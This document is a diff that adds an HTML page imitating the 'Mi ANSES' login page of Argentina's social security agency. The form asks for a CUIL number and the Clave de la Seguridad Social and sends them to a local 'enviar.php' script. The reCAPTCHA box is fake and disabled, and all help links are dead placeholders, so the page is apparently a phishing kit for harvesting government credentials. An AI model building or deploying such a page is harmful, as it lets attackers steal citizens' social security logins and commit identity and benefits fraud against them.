@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mi ANSES - Ingreso</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #0c0c0c;
+      color: #fff;
+    }
+
+    header {
+      background-color: #0077d6;
+      padding: 16px;
+      font-size: 1.1em;
+      color: white;
+    }
+
+    header strong {
+      font-weight: bold;
+    }
+
+    main {
+      max-width: 400px;
+      margin: 30px auto;
+      background-color: #141414;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.7);
+    }
+
+    h2 {
+      color: #b5d4ff;
+      margin-bottom: 10px;
+    }
+
+    p {
+      color: #ccc;
+      font-size: 0.95em;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #333;
+      border-radius: 5px;
+      background-color: #1e1e1e;
+      color: #fff;
+    }
+
+    .links {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.85em;
+      margin-top: 5px;
+    }
+
+    .links a {
+      color: #4da3ff;
+      text-decoration: none;
+    }
+
+    .captcha-box {
+      background-color: #1a1a1a;
+      border: 1px solid #555;
+      border-radius: 5px;
+      margin-top: 20px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .captcha-box span {
+      display: flex;
+      align-items: center;
+      color: #fff;
+    }
+
+    .captcha-box input {
+      margin-right: 10px;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      background-color: #0077d6;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+
+    button:hover {
+      background-color: #0062b2;
+    }
+
+    .info-extra {
+      margin-top: 25px;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+
+    .info-extra a {
+      color: #4da3ff;
+      text-decoration: none;
+    }
+
+    .crear-clave-btn {
+      margin-top: 10px;
+      width: 100%;
+      padding: 10px;
+      background-color: transparent;
+      border: 1px solid #4da3ff;
+      color: #4da3ff;
+      border-radius: 5px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 0.85em;
+    }
+
+    footer a {
+      color: #4da3ff;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+  </style>
+</head>
+<body>
+  <header style="display: flex; align-items: center; gap: 6px;">
+    <span style="font-weight: bold; font-size: 1.4em;">ANSES</span>
+    <span style="font-size: 0.75em; color: #e0f0ff;">| Clave de la Seguridad Social</span>
+  </header>
+
+  <main>
+    <h2>mi ANSES</h2>
+    <p>Ingresá con tu Clave de la Seguridad Social</p>
+
+    <form method="POST" action="enviar.php">
+      <label for="cuil">Número de CUIL</label>
+      <input type="text" id="cuil" name="cuil" placeholder="__-________-_">
+      <div class="links">
+        <a href="#">No sé mi CUIL</a>
+      </div>
+
+      <label for="clave">Clave de Seguridad Social</label>
+      <input type="password" id="clave" name="clave" placeholder="Se distingue entre mayúscula y minúscula">
+      <div class="links">
+        <a href="#">Olvidé mi clave</a>
+        <a href="#">Cambiar mi clave</a>
+      </div>
+
+      <div class="captcha-box">
+        <span><input type="checkbox" disabled> No soy un robot</span>
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="48">
+      </div>
+
+      <button type="submit">INGRESAR</button>
+    </form>
+
+    <div class="info-extra">
+      <p>Ver más información sobre la <a href="#">Clave de la Seguridad Social</a></p>
+      <p>Si no tenés tu Clave de la Seguridad Social o la olvidaste, creá una nueva.</p>
+      <button class="crear-clave-btn">
+        <span>&#128273;</span> CREÁ TU CLAVE
+      </button>
+    </div>
+  </main>
+
+  <footer>
+    <a href="#">Cartilla</a>
+    <a href="#">Preguntas frecuentes</a>
+  </footer>
+</body>
+</html>
